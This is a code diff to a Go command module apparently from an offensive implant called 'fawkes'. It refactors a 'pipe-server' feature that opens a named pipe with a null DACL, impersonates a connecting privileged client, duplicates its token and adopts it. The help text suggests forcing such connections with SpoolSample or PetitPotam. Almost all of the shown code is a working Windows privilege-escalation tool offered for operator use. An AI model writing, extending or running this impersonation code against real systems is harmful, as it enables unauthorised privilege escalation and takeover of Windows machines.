@@ -4,11 +4,12 @@
 package commands
 
 import (
+	"crypto/rand"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"runtime"
 	"strings"
-	"time"
 	"unsafe"
 
 	"fawkes/pkg/structs"
@@ -54,11 +55,7 @@ func (c *PipeServerCommand) Execute(task structs.Task) structs.CommandResult {
 	var args pipeServerArgs
 	if task.Params != "" {
 		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Failed to parse parameters: %v", err)
 		}
 	}
 
@@ -75,11 +72,7 @@ func (c *PipeServerCommand) Execute(task structs.Task) structs.CommandResult {
 	case "check":
 		return pipeServerCheck(task)
 	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown action: %s. Use: impersonate, check", args.Action),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Unknown action: %s. Use: impersonate, check", args.Action)
 	}
 }
 
@@ -140,17 +133,15 @@ func pipeServerCheck(task structs.Task) structs.CommandResult {
 	sb.WriteString("pipe-server -action impersonate -name mypipe -timeout 30\n")
 	sb.WriteString("Then trigger a connection from a privileged service (e.g., SpoolSample, PetitPotam).\n")
 
-	return structs.CommandResult{
-		Output:    sb.String(),
-		Status:    "success",
-		Completed: true,
-	}
+	return successResult(sb.String())
 }
 
 // pipeServerImpersonate creates a named pipe, waits for connection, and impersonates
 func pipeServerImpersonate(task structs.Task, args pipeServerArgs) structs.CommandResult {
 	if args.Name == "" {
-		args.Name = fmt.Sprintf("svc_%d", time.Now().UnixNano()%100000)
+		var rb [4]byte
+		_, _ = rand.Read(rb[:])
+		args.Name = hex.EncodeToString(rb[:])
 	}
 
 	pipePath := fmt.Sprintf(`\\.\pipe\%s`, args.Name)
@@ -161,18 +152,10 @@ func pipeServerImpersonate(task structs.Task, args pipeServerArgs) structs.Comma
 	// SetDACL will fail with ERROR_INVALID_SECURITY_DESCR.
 	sd, sdErr := windows.NewSecurityDescriptor()
 	if sdErr != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to initialize security descriptor: %v", sdErr),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to initialize security descriptor: %v", sdErr)
 	}
 	if err := sd.SetDACL(nil, true, false); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to set DACL on security descriptor: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to set DACL on security descriptor: %v", err)
 	}
 
 	sa := windows.SecurityAttributes{
@@ -186,11 +169,7 @@ func pipeServerImpersonate(task structs.Task, args pipeServerArgs) structs.Comma
 	// notifying Go's scheduler, which can prevent timers from firing.
 	pipeNamePtr, err := windows.UTF16PtrFromString(pipePath)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to convert pipe name: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to convert pipe name: %v", err)
 	}
 
 	hPipe, _, createErr := procCreateNamedPipeW.Call(
@@ -205,11 +184,7 @@ func pipeServerImpersonate(task structs.Task, args pipeServerArgs) structs.Comma
 	)
 
 	if hPipe == uintptr(windows.InvalidHandle) {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("CreateNamedPipe failed: %v", createErr),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("CreateNamedPipe failed: %v", createErr)
 	}
 	pipeHandle := windows.Handle(hPipe)
 	defer windows.CloseHandle(pipeHandle)
@@ -217,11 +192,7 @@ func pipeServerImpersonate(task structs.Task, args pipeServerArgs) structs.Comma
 	// Create an event for overlapped ConnectNamedPipe
 	event, eventErr := windows.CreateEvent(nil, 1, 0, nil) // manual-reset, initially non-signaled
 	if eventErr != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("CreateEvent failed: %v", eventErr),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("CreateEvent failed: %v", eventErr)
 	}
 	defer windows.CloseHandle(event)
 
@@ -233,11 +204,7 @@ func pipeServerImpersonate(task structs.Task, args pipeServerArgs) structs.Comma
 	if ret == 0 {
 		// ConnectNamedPipe returned FALSE — check error code
 		if connectErr != windows.ERROR_IO_PENDING && connectErr != windows.ERROR_PIPE_CONNECTED {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("ConnectNamedPipe failed: %v", connectErr),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("ConnectNamedPipe failed: %v", connectErr)
 		}
 		// ERROR_IO_PENDING = async operation in progress, wait on event
 		// ERROR_PIPE_CONNECTED = client already connected before call
@@ -254,37 +221,21 @@ func pipeServerImpersonate(task structs.Task, args pipeServerArgs) structs.Comma
 		case 258: // WAIT_TIMEOUT (windows.WAIT_TIMEOUT is syscall.Errno, not uint32)
 			// Cancel the pending I/O and clean up
 			windows.CancelIoEx(pipeHandle, &overlapped)
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Timeout after %ds — no client connected to %s", args.Timeout, pipePath),
-				Status:    "success",
-				Completed: true,
-			}
+			return successf("Timeout after %ds — no client connected to %s", args.Timeout, pipePath)
 		default:
 			windows.CancelIoEx(pipeHandle, &overlapped)
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("WaitForSingleObject failed: result=%d err=%v", waitResult, waitErr),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("WaitForSingleObject failed: result=%d err=%v", waitResult, waitErr)
 		}
 	}
 
 	if !connected {
-		return structs.CommandResult{
-			Output:    "Unexpected state: not connected after wait",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Unexpected state: not connected after wait")
 	}
 
 	// Check for task cancellation
 	if task.DidStop() {
 		procDisconnectNamedPipe.Call(hPipe)
-		return structs.CommandResult{
-			Output:    "Pipe server cancelled",
-			Status:    "success",
-			Completed: true,
-		}
+		return successResult("Pipe server cancelled")
 	}
 
 	// Lock goroutine to OS thread for the entire impersonation sequence.
@@ -299,11 +250,7 @@ func pipeServerImpersonate(task structs.Task, args pipeServerArgs) structs.Comma
 	if ret == 0 {
 		runtime.UnlockOSThread()
 		procDisconnectNamedPipe.Call(hPipe)
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("ImpersonateNamedPipeClient failed: %v\nThis usually means SeImpersonatePrivilege is not available.", impErr),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("ImpersonateNamedPipeClient failed: %v\nThis usually means SeImpersonatePrivilege is not available.", impErr)
 	}
 
 	// Get the impersonated identity
@@ -325,11 +272,7 @@ func pipeServerImpersonate(task structs.Task, args pipeServerArgs) structs.Comma
 		procRevertToSelf.Call()
 		runtime.UnlockOSThread()
 		procDisconnectNamedPipe.Call(hPipe)
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Client connected as %s but failed to capture thread token: %v", clientIdentity, err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Client connected as %s but failed to capture thread token: %v", clientIdentity, err)
 	}
 
 	// Duplicate the token for persistent use
@@ -359,11 +302,7 @@ func pipeServerImpersonate(task structs.Task, args pipeServerArgs) structs.Comma
 		procRevertToSelf.Call()
 		runtime.UnlockOSThread()
 		procDisconnectNamedPipe.Call(hPipe)
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Client connected as %s but DuplicateTokenEx failed: %v", clientIdentity, err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Client connected as %s but DuplicateTokenEx failed: %v", clientIdentity, err)
 	}
 
 	// Revert the named pipe impersonation, then apply via our token system
@@ -374,11 +313,7 @@ func pipeServerImpersonate(task structs.Task, args pipeServerArgs) structs.Comma
 	if setErr := SetIdentityToken(dupToken); setErr != nil {
 		runtime.UnlockOSThread()
 		windows.CloseHandle(windows.Handle(dupToken))
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Client connected as %s but SetIdentityToken failed: %v", clientIdentity, setErr),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Client connected as %s but SetIdentityToken failed: %v", clientIdentity, setErr)
 	}
 
 	// Mark as thread-locked so PrepareExecution doesn't double-lock
@@ -392,11 +327,7 @@ func pipeServerImpersonate(task structs.Task, args pipeServerArgs) structs.Comma
 	sb.WriteString("\nUse 'rev2self' to revert to original identity.\n")
 	sb.WriteString("Use 'whoami' to verify current context.\n")
 
-	return structs.CommandResult{
-		Output:    sb.String(),
-		Status:    "success",
-		Completed: true,
-	}
+	return successResult(sb.String())
 }
 
 // checkPrivilege checks if the current process has a specific privilege
